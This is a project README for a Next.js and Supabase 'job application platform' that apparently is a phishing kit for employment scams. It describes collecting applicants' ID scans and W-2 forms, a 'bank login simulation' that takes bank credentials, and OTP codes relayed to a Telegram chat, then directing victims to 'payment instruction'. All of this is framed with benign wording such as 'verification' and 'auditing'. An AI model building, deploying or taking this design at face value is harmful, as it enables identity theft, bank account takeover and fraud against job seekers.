# Vaco Job Application Platform

A full-stack job application management system built with **Next.js 15**, **TypeScript**, **Tailwind CSS**, and **Supabase**.  
The platform streamlines job applications, onboarding, and applicant tracking, providing an end-to-end hiring workflow.

---

## 🚀 Features

- **Applicant Form Submission** – Candidates can easily apply via a dynamic and responsive form.
- **Onboarding Flow** – Secure file uploads (ID front, ID back, W-2 forms) stored in Supabase.
- **Bank Login Simulation** – Optional simulated bank credential form for verification flows.
- **OTP Verification** – Multi-step OTP process for enhanced security checks.
- **Admin Dashboard** – Manage applicants, onboarding status, and view uploaded documents.
- **Telegram Integration** – Instant notifications for new applications and uploads.
- **Responsive UI** – Mobile-first design with Tailwind CSS.
- **PostgreSQL Database** – Hosted on Vercel with schema for applicants, onboarding, and login data.

---

## 🛠️ Tech Stack

**Frontend**
- Next.js 15 (App Router)
- React
- Tailwind CSS
- TypeScript
- Framer Motion (animations)

**Backend**
- Next.js API Routes
- Supabase (file storage & public URLs)
- PostgreSQL (via @vercel/postgres)
- Telegram Bot API

**Dev Tools**
- pnpm
- ESLint
- Git & GitHub
- Vercel Deployment

---

## 📂 Project Structure

app/
├── api/ # API routes (apply, onboarding, bank-login, otp-login, send-telegram)
├── ui/ # Reusable UI components
├── lib/ # Helper functions, Supabase client, Telegram utility
├── apply/ # Applicant submission page
├── onboarding/ # Onboarding form pages
├── contact/ # Contact page
├── taxes/ # Tax filing checklist workflow
├── dashboard/ # Admin dashboard pages
└── globals.css # Tailwind base styles


---

## ⚙️ Environment Variables

Create a `.env` file in the project root:

```env
# Telegram
NEXT_PUBLIC_TELEGRAM_BOT_TOKEN=your_telegram_bot_token
NEXT_PUBLIC_TELEGRAM_CHAT_ID=your_chat_id

# Supabase
NEXT_PUBLIC_SUPABASE_URL=your_supabase_url
NEXT_PUBLIC_SUPABASE_ANON_KEY=your_supabase_anon_key

# PostgreSQL (Vercel)
POSTGRES_URL=your_postgres_connection_url

🛠 Core Workflows
Application Submission
Applicant fills out form on /apply

Resume is uploaded to Supabase Storage

Resume URL and form data are POSTed to /api/apply

Telegram notification is sent with applicant info

Success flow redirects to /apply/success

Onboarding
Onboarding form collects identity docs (front/back ID) and W-2

Files are validated (type/size), uploaded to Supabase

Applicant data is inserted or upserted into Postgres

Telegram alert with public URLs of uploaded docs

Login + OTP
Conditional UI based on previous answers (e.g., platform selection)

Login attempts and OTP codes are relayed to Telegram for auditing/tracking

After OTP verification, user is directed to payment instruction

📦 Supabase Integration
Storage bucket: onboarding (for identity and document uploads)

Public URLs are retrieved after upload for preview/linking

Ensure correct CORS and public policies based on desired visibility

🔐 Telegram Integration
Messages are formatted and sent via the bot token to a designated chat. Typical notifications include:

Login attempts (platform/email)

OTP submission

New onboarding with links to uploaded documents

🧪 Validation & UX
File type/size validation:

Images: JPEG/PNG/WebP up to 5MB

PDF (W-2): up to 10MB

Spinner overlays and button-level loading states for all async actions

Disables background interaction during critical flows

📦 Deployment
Recommended platform: Vercel

Connect the GitHub repository to Vercel

Set environment variables in Vercel dashboard

Push to main (or configured branch) to trigger automatic build

Vercel handles optimization, static generation, and serverless functions